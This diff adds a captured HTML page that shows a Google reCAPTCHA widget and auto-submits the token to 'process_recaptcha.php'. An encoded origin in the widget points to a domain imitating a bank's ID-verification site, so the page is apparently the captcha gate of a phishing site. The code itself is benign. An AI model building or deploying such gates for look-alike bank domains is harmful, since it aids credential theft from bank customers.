@@ -1,0 +1,39 @@
+<html><head><meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>reCAPTCHA</title>
+    <script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/_ZpyzC9NQw3gYt1GHTrnprhx/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-BV6XqFbO5oSupgYsQtf8/u6H/OBQ8/MVJ7uHSSnUxTLXWEWDLR+sBfUdq8nShBd2"></script><script src="https://www.google.com/recaptcha/api.js" async="" defer=""></script>
+    <script>
+        // Callback function executed when the user completes the CAPTCHA
+        function onRecaptchaSuccess(token) {
+            // Set the reCAPTCHA token to the hidden input field
+            document.getElementById('recaptcha-response').value = token;
+            // Submit the form automatically
+            document.getElementById('recaptcha-form').submit();
+        }
+    </script>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        form {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <form id="recaptcha-form" action="process_recaptcha.php" method="POST">
+        <!-- Visible reCAPTCHA widget with callback on success -->
+        <div class="g-recaptcha" data-sitekey="6Ld0o_0pAAAAANoA1a5VU-dD8xlIGY1QaxDOYDI8" data-callback="onRecaptchaSuccess"><div style="width: 304px; height: 78px;"><div><iframe title="reCAPTCHA" width="304" height="78" role="presentation" name="a-ic8i25v81q4u" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Ld0o_0pAAAAANoA1a5VU-dD8xlIGY1QaxDOYDI8&amp;co=aHR0cHM6Ly9pZHZlcmlmeWNoYXNlLXNlY3VyZS5jb206NDQz&amp;hl=en&amp;v=_ZpyzC9NQw3gYt1GHTrnprhx&amp;size=normal&amp;cb=vurvnv142yky"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
+        <!-- Hidden input to store the reCAPTCHA token -->
+        <input type="hidden" id="recaptcha-response" name="g-recaptcha-response">
+        <!-- Optional: Keep a submit button for browsers that don't support JavaScript -->
+        <input type="submit" value="Submit" style="display: none;">
+    </form>
+
+
+<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility linear 0.3s, opacity 0.3s linear; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge expires in two minutes" name="c-ic8i25v81q4u" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=_ZpyzC9NQw3gYt1GHTrnprhx&amp;k=6Ld0o_0pAAAAANoA1a5VU-dD8xlIGY1QaxDOYDI8" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
